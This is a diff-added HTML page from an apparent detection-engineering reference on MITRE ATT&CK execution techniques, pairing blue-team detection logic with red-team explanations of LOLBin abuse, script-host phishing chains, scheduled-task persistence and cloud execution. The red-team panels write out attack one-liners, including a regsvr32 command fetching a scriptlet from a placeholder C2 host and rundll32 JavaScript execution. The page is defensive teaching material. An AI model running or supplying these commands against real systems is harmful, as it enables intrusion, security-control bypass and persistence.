+              <div class="attack-text">Mshta executes HTA (HTML Application) files which run VBScript/JScript with full system access. <strong>Minimum truth:</strong> mshta.exe with a remote URL argument OR spawning from an Office process. Alert on mshta network connections, mshta spawning any child process, mshta accessing TEMP directory.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>Phishing chain:</strong> Email link → attacker-hosted <code>.hta</code> file → Windows executes it as trusted application → VBScript drops payload, creates scheduled task, executes next stage.<br><br>
+                <strong>Why HTA:</strong> Bypasses Mark-of-the-Web on some Windows versions, executes outside browser sandbox, full COM object access, can spawn any process. Heavily used by commodity RAT distributors pre-2022.
+                <div class="tags-row">
+                  <span class="tag tag-red">Emotet HTA variant</span>
+                  <span class="tag tag-red">Lokibot dropper</span>
+                  <span class="tag tag-red">Astaroth</span>
+                  <a href="https://attack.mitre.org/groups/G0127/" class="tag tag-gold" target="_blank">TA570</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cousin-card" id="cc-lol-reg32">
+          <div class="cousin-header" onclick="toggleCousin('cc-lol-reg32')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">Regsvr32 Squiblydoo / COM Scriptlet</div>
+              <div class="cousin-ttp-badge">T1218.010</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1218/010/" class="link-ext" target="_blank">🔗 T1218.010</a>
+              <a href="https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/" class="link-ext" target="_blank">🔗 LOLBAS: regsvr32</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Execution → AppLocker/WDAC bypass</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">Regsvr32 can load a remote <code>.sct</code> scriptlet via <code>/s /n /u /i:[URL] scrobj.dll</code>. Minimum truth: <strong>regsvr32.exe with <code>/i:http</code> argument</strong> OR regsvr32 initiating a network connection. The scriptlet is fetched at runtime — no file on disk at time of detection.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                One of the original AppLocker bypasses (Squiblydoo technique, 2016). Still relevant because many environments have not blocked regsvr32 network access.<br><br>
+                <strong>Single command, no file drop:</strong> <code>regsvr32 /s /n /u /i:http://[C2]/p.sct scrobj.dll</code> — scriptlet runs JScript/VBScript spawning any process or loading shellcode.
+                <div class="tags-row">
+                  <span class="tag tag-red">ROKRAT</span>
+                  <span class="tag tag-red">Squiblydoo PoC</span>
+                  <a href="https://attack.mitre.org/groups/G0067/" class="tag tag-gold" target="_blank">APT37</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cousin-card" id="cc-lol-rundll">
+          <div class="cousin-header" onclick="toggleCousin('cc-lol-rundll')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">Rundll32 Arbitrary Code / JS Execution</div>
+              <div class="cousin-ttp-badge">T1218.011</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1218/011/" class="link-ext" target="_blank">🔗 T1218.011</a>
+              <a href="https://lolbas-project.github.io/lolbas/Binaries/Rundll32/" class="link-ext" target="_blank">🔗 LOLBAS: rundll32</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Execution → Defense Evasion</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">Rundll32 is heavily used legitimately — the rule targets <strong>behavioural anomaly, not presence</strong>. Minimum truth: rundll32 loading a DLL from TEMP/AppData/non-system path, rundll32 making network connections, rundll32 spawning child processes, or JavaScript execution via <code>rundll32 javascript:</code>. The JS execution variant is a strong high-fidelity signal.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>DLL load:</strong> <code>rundll32.exe C:\Users\Public\p.dll,EntryPoint</code> — loads attacker DLL dropped to user-writable path.<br><br>
+                <strong>JS execution (no file):</strong> <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"</code> — spawns script host with no file on disk, full JScript access to COM objects.<br><br>
+                Used heavily in Cobalt Strike post-exploitation for DLL injection and process execution.
+                <div class="tags-row">
+                  <span class="tag tag-red">Cobalt Strike DLL stager</span>
+                  <span class="tag tag-red">Qakbot</span>
+                  <span class="tag tag-red">IcedID</span>
+                  <a href="https://attack.mitre.org/groups/G0127/" class="tag tag-gold" target="_blank">TA551</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cousin-card" id="cc-lol-msbuild">
+          <div class="cousin-header" onclick="toggleCousin('cc-lol-msbuild')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">MSBuild Inline C# Execution</div>
+              <div class="cousin-ttp-badge">T1127.001</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1127/001/" class="link-ext" target="_blank">🔗 T1127.001</a>
+              <a href="https://lolbas-project.github.io/lolbas/Binaries/Msbuild/" class="link-ext" target="_blank">🔗 LOLBAS: MSBuild</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Execution → CLM/AppLocker bypass</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">MSBuild can execute inline C# code from a .csproj file, completely bypassing PowerShell CLM, AppLocker script rules, and AMSI. <strong>Minimum truth:</strong> MSBuild.exe executing a project file from a user-writable path or TEMP, MSBuild spawning any network connection, MSBuild spawning cmd.exe or PowerShell. In most enterprise environments, developers using MSBuild work in designated directories — any deviation is anomalous.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>Bypasses:</strong> AppLocker (whitelisted), CLM (uses .NET CLR directly), AMSI (invokes shellcode directly via unsafe C#), Script Block Logging (no PowerShell engine involved).<br><br>
+                <strong>Technique:</strong> Drop a malicious <code>.csproj</code> file containing inline C# shellcode runner, execute via <code>MSBuild.exe malicious.csproj</code>. The C# code allocates memory, writes shellcode, executes — standard Cobalt Strike or Metasploit shellcode delivery, zero PowerShell.
+                <div class="tags-row">
+                  <a href="https://github.com/Cn33liz/MSBuildShell" class="tag tag-red" target="_blank">MSBuildShell</a>
+                  <a href="https://github.com/tyranid/DotNetToJScript" class="tag tag-red" target="_blank">DotNetToJScript</a>
+                  <span class="tag tag-red">GadgetToJScript</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cousin-card" id="cc-lol-odbcconf">
+          <div class="cousin-header" onclick="toggleCousin('cc-lol-odbcconf')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">Odbcconf / Regasm / Regsvcs DLL Execution</div>
+              <div class="cousin-ttp-badge">T1218.008 · T1218.009</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/" class="link-ext" target="_blank">🔗 LOLBAS: odbcconf</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Execution → Defense Evasion (lesser-known LOLBins)</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">Lesser-known LOLBins that receive less detection attention and are used precisely because of that. Odbcconf can load a DLL via <code>/a {REGSVR [malicious.dll]}</code>. Regasm/Regsvcs execute .NET assembly code with minimal detection. The cousin rule covers all three under the same intent anchor: signed binary loading or executing an attacker-controlled DLL/assembly from a user-writable path.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>Why lesser-known LOLBins:</strong> Detection engineering and threat hunting activity focusses on certutil, mshta, and regsvr32. Odbcconf, regasm, and regsvcs are in the same trusted binary category but receive a fraction of the detection attention — exactly why sophisticated actors pivot to them when primary LOLBins are blocked or detected.
+                <div class="tags-row">
+                  <span class="tag tag-red">APT custom tooling</span>
+                  <span class="tag tag-red">Red team pivoting</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- ECOSYSTEM 4: Scripting - CMD/VBS/JS -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="ecosystem" id="eco-script">
+  <div class="eco-header" onclick="toggleEco('eco-script')">
+    <div class="eco-id">T1059.003 · T1059.005 · T1059.007</div>
+    <div>
+      <div class="eco-title">Scripting Interpreter Ecosystem — Cmd / VBScript / JScript</div>
+      <div class="eco-sub">EXECUTION · COMMAND AND SCRIPTING INTERPRETER · MULTI-SUBSTRATE COUSIN CLUSTER</div>
+    </div>
+    <div class="eco-toggle">▼</div>
+  </div>
+  <div class="eco-body">
+    <div class="core-composite">
+      <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+      <div class="core-rule-name">Scripting Engine Anomalous Network / Child Process Anchor</div>
+      <div class="links-row">
+        <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK · KQL · Sentinel + MDE</a>
+        <a href="https://attack.mitre.org/techniques/T1059/003/" class="link-ext" target="_blank">🔗 T1059.003 cmd</a>
+        <a href="https://attack.mitre.org/techniques/T1059/005/" class="link-ext" target="_blank">🔗 T1059.005 VBS</a>
+        <a href="https://attack.mitre.org/techniques/T1059/007/" class="link-ext" target="_blank">🔗 T1059.007 JS</a>
+      </div>
+      <div class="two-col">
+        <div class="panel-blue">
+          <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+          <div class="panel-text">
+            The scripting engine cousin cluster covers all native Windows scripting substrates. Each is a cousin of PowerShell — same adversary intent (execute arbitrary code via trusted interpreter) across different substrates. <strong>Minimum truth:</strong> scripting engine (cscript.exe, wscript.exe, cmd.exe) spawning from an anomalous parent (Office, browser, WMI) OR scripting engine initiating network connection OR scripting engine spawning a second-stage executable from a user-writable path.<br><br>
+            <strong>Key cousin pairs:</strong> cscript/wscript are substrate cousins — the same <code>.vbs</code> script runs via either. wscript running a <code>.js</code> file is a JScript execution cousin to VBScript. All share the same detection anchor.
+          </div>
+        </div>
+        <div class="panel-red">
+          <div class="panel-label lbl-red">🔴 RED TEAM</div>
+          <div class="panel-text">
+            <strong>VBScript/JScript via wscript/cscript:</strong> Used heavily in phishing delivery (malicious <code>.vbs</code>, <code>.js</code>, <code>.wsf</code> attachments). Double-click executes via wscript.exe — full COM object access, can spawn processes, download files, create registry keys, all without PowerShell.<br><br>
+            <strong>DDE (Dynamic Data Exchange):</strong> Office documents trigger cmd.exe execution via DDE field codes — no macros, no VBA. The execution appears to come from the Office process. Used by <a href="https://attack.mitre.org/groups/G0032/" class="link-ext" target="_blank">Lazarus</a> and <a href="https://attack.mitre.org/groups/G0016/" class="link-ext" target="_blank">APT29</a> campaigns.
+            <div class="tags-row">
+              <span class="tag tag-red">Emotet VBS dropper</span>
+              <span class="tag tag-red">Agent Tesla JS variant</span>
+              <span class="tag tag-red">DDE execution</span>
+              <a href="https://attack.mitre.org/groups/G0032/" class="tag tag-gold" target="_blank">Lazarus</a>
+              <a href="https://attack.mitre.org/groups/G0050/" class="tag tag-gold" target="_blank">APT32</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="cousin-section">
+      <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+      <div class="cousin-grid">
+
+        <div class="cousin-card" id="cc-script-wscript">
+          <div class="cousin-header" onclick="toggleCousin('cc-script-wscript')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">Wscript/Cscript Anomalous Network / Spawn</div>
+              <div class="cousin-ttp-badge">T1059.005 · T1059.007</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Initial Execution (phishing attachment) → Payload Download</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">Wscript and cscript are substrate cousins — identical capability, different execution mode (GUI vs console). Alert on either: (1) spawning from an Office application, browser, or download manager, (2) initiating outbound network connections, (3) creating/executing files in TEMP/AppData, (4) spawning cmd.exe or PowerShell. Script content inspection via ScriptBlock equivalent for VBS is limited — focus on behaviour, not content.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>Classic phishing chain:</strong> ZIP → <code>invoice.js</code> or <code>order.vbs</code> → user double-clicks → wscript.exe executes → downloads and runs Emotet/Qakbot/AsyncRAT.<br><br>
+                <strong>Why no macros:</strong> Office macro execution now requires explicit user enablement (2022+ default). VBS/JS attachments bypass this — they execute via Windows Script Host, not Office.
+                <div class="tags-row">
+                  <span class="tag tag-red">Emotet</span>
+                  <span class="tag tag-red">Qakbot</span>
+                  <span class="tag tag-red">AsyncRAT dropper</span>
+                  <a href="https://attack.mitre.org/groups/G0127/" class="tag tag-gold" target="_blank">TA551</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cousin-card" id="cc-script-office">
+          <div class="cousin-header" onclick="toggleCousin('cc-script-office')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">Office Macro Execution Chain</div>
+              <div class="cousin-ttp-badge">T1059.005 · T1204.002</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1204/002/" class="link-ext" target="_blank">🔗 T1204.002 Malicious File</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Initial Access (phishing) → Execution</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text"><strong>Minimum truth:</strong> Office process (winword.exe, excel.exe, powerpnt.exe) spawning any child process that is not a legitimate Office subprocess. This is one of the highest-fidelity signals available — Word spawning cmd.exe or PowerShell has an extremely low false positive rate in most enterprises. Reinforce with: spawned process making network connections, spawned process writing to TEMP, parent document path anomaly.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                Office macros remain the most reliable initial access mechanism for targeted attacks despite Microsoft's 2022 blocking of macros in internet-sourced files. Attackers respond with: password-protected ZIPs (bypass SmartScreen), ISO/IMG containers (bypass MOTW), <a href="https://attack.mitre.org/techniques/T1566/001/" class="link-ext" target="_blank">OneNote embedded executables</a>, and HTML smuggling.<br><br>
+                <strong>Execution chain:</strong> Macro → Shell command → PowerShell download cradle → in-memory beacon.
+                <div class="tags-row">
+                  <span class="tag tag-red">Emotet</span>
+                  <span class="tag tag-red">Dridex</span>
+                  <span class="tag tag-red">BazarLoader</span>
+                  <a href="https://attack.mitre.org/groups/G0046/" class="tag tag-gold" target="_blank">FIN7</a>
+                  <a href="https://attack.mitre.org/groups/G0080/" class="tag tag-gold" target="_blank">Lazarus</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- ECOSYSTEM 5: Scheduled Tasks / At -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="ecosystem" id="eco-schtask">
+  <div class="eco-header" onclick="toggleEco('eco-schtask')">
+    <div class="eco-id">T1053.005</div>
+    <div>
+      <div class="eco-title">Scheduled Task Execution — Persistence-Linked Execution</div>
+      <div class="eco-sub">EXECUTION · PERSISTENCE · SCHEDULED TASK/JOB</div>
+    </div>
+    <div class="eco-toggle">▼</div>
+  </div>
+  <div class="eco-body">
+    <div class="core-composite">
+      <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+      <div class="core-rule-name">Scheduled Task Creation with Anomalous Action — Non-IT Process Anchor</div>
+      <div class="links-row">
+        <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK · KQL · Sentinel + MDE</a>
+        <a href="https://attack.mitre.org/techniques/T1053/005/" class="link-ext" target="_blank">🔗 MITRE T1053.005</a>
+      </div>
+      <div class="two-col">
+        <div class="panel-blue">
+          <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+          <div class="panel-text">
+            Scheduled tasks created by non-IT processes are high-fidelity signals. <strong>Minimum truth:</strong> Event ID 4698 (task created) where the creating process is not a known IT management tool AND the task action contains PowerShell encoded commands, script execution from TEMP/AppData, or LOLBin execution.<br><br>
+            Monitor the full task XML — the <code>&lt;Actions&gt;</code> element reveals the complete command and is frequently obfuscated. The 30-day Atomic Sentinel Layer tracks task creation independently of task execution, catching staged persistence set up well before activation.
+          </div>
+        </div>
+        <div class="panel-red">
+          <div class="panel-label lbl-red">🔴 RED TEAM</div>
+          <div class="panel-text">
+            <strong>Why tasks over run keys:</strong> More control (specific triggers, user context, retry logic), more legitimate cover noise, can run as SYSTEM with admin rights, survives user logoff.<br><br>
+            <strong>APT persistence pattern:</strong> Create task with name mimicking Windows Update (<code>WindowsUpdateCheck</code>, <code>MicrosoftEdgeUpdateTask</code>), trigger on logon or every 4 hours, action runs a PowerShell download cradle. Task survives reboots, user changes, and most AV remediation focused on files.
+            <div class="tags-row">
+              <span class="tag tag-red">Cobalt Strike schtasks</span>
+              <span class="tag tag-red">IcedID persistence</span>
+              <span class="tag tag-red">TrickBot</span>
+              <a href="https://attack.mitre.org/groups/G0096/" class="tag tag-gold" target="_blank">APT41</a>
+              <a href="https://attack.mitre.org/groups/G0046/" class="tag tag-gold" target="_blank">FIN7</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="cousin-section">
+      <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+      <div class="cousin-grid">
+        <div class="cousin-card" id="cc-schtask-at">
+          <div class="cousin-header" onclick="toggleCousin('cc-schtask-at')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">AT Job / COM-Based Task Creation</div>
+              <div class="cousin-ttp-badge">T1053.002 · T1053.005</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1053/002/" class="link-ext" target="_blank">🔗 T1053.002</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Persistence → Execution (alternate task substrate)</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">The AT command and COM-based task creation (via <code>ITaskService</code>) are substrate cousins to schtasks.exe. COM-based creation bypasses some endpoint controls that only monitor the schtasks.exe process. Monitor for the underlying Windows Task Scheduler COM interface being called by unusual processes — <code>taskschd.dll</code> loaded by non-task-management processes is a signal.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                Cobalt Strike's <code>elevate svc-exe</code> and some BOFs create scheduled tasks via COM rather than schtasks.exe — specifically to avoid process-level monitoring of the schtasks binary. The underlying task creation is identical but the substrate (COM vs command line) differs.
+                <div class="tags-row">
+                  <span class="tag tag-red">Cobalt Strike BOF task</span>
+                  <span class="tag tag-red">SharpTask</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- ECOSYSTEM 6: Container/Cloud Execution -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="ecosystem" id="eco-cloud">
+  <div class="eco-header" onclick="toggleEco('eco-cloud')">
+    <div class="eco-id">T1609 · T1610 · T1651</div>
+    <div>
+      <div class="eco-title">Cloud & Container Execution — Modern Attack Surface</div>
+      <div class="eco-sub">EXECUTION · CLOUD · CONTAINER ADMINISTRATION COMMANDS</div>
+    </div>
+    <div class="eco-toggle">▼</div>
+  </div>
+  <div class="eco-body">
+    <div class="core-composite">
+      <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+      <div class="core-rule-name">Container Escape / SSM Command Execution Anomaly Anchor</div>
+      <div class="links-row">
+        <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK · KQL · Sentinel + MDE + CloudTrail</a>
+        <a href="https://attack.mitre.org/techniques/T1609/" class="link-ext" target="_blank">🔗 T1609 Container Admin</a>
+        <a href="https://attack.mitre.org/techniques/T1651/" class="link-ext" target="_blank">🔗 T1651 Cloud Admin Command</a>
+      </div>
+      <div class="two-col">
+        <div class="panel-blue">
+          <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+          <div class="panel-text">
+            Cloud execution surfaces are increasingly targeted. <strong>Minimum truth:</strong> SSM SendCommand or RunShellScript targeting EC2 instances from non-administrative IAM principals; <code>kubectl exec</code> spawning interactive shells in production pods; Lambda function invocations with anomalous environment variable injection; Docker daemon API calls creating privileged containers from non-orchestration identities.<br><br>
+            M365/Azure equivalent: Azure VM RunCommand execution from anomalous service principal, Azure Automation runbook execution by non-automation identity.
+          </div>
+        </div>
+        <div class="panel-red">
+          <div class="panel-label lbl-red">🔴 RED TEAM</div>
+          <div class="panel-text">
+            Cloud execution is increasingly the post-exploitation target as organisations migrate workloads. <strong>Key attack chains:</strong><br>
+            1. Compromised IAM credentials → <code>aws ssm send-command</code> → shell on every EC2 instance with SSM agent<br>
+            2. SSRF in web app → metadata service credential theft → same SSM/EC2 execution path<br>
+            3. kubectl exec into production pod → container escape via misconfigured privileged mode → host node compromise<br><br>
+            SSM is particularly powerful: one compromised admin IAM key = lateral execution across hundreds of EC2 instances simultaneously.
+            <div class="tags-row">
+              <span class="tag tag-red">Pacu (AWS exploitation)</span>
+              <span class="tag tag-red">Nimbostratus</span>
+              <span class="tag tag-red">kubectl exec</span>
+              <a href="https://attack.mitre.org/groups/G0096/" class="tag tag-gold" target="_blank">APT41</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- end main -->
+
+<footer class="site-footer">
+  ALA DABAT · MTDF · EXECUTION TA0002 · <a href="index.html" style="color:var(--blue-primary);text-decoration:none;">← Back to Index</a> · <a href="persistence.html" style="color:var(--blue-primary);text-decoration:none;">Persistence →</a><br>
+  <span class="t-red">RED TEAM CONTENT</span> — All methodology at CEH/OSCP/public disclosure level. Documented in MITRE ATT&CK and professional certification curricula.
+</footer>
+
+<a href="#" class="scroll-top" title="Back to top">↑</a>
+<script src="mtdf.js"></script>
+</body>
+</html>
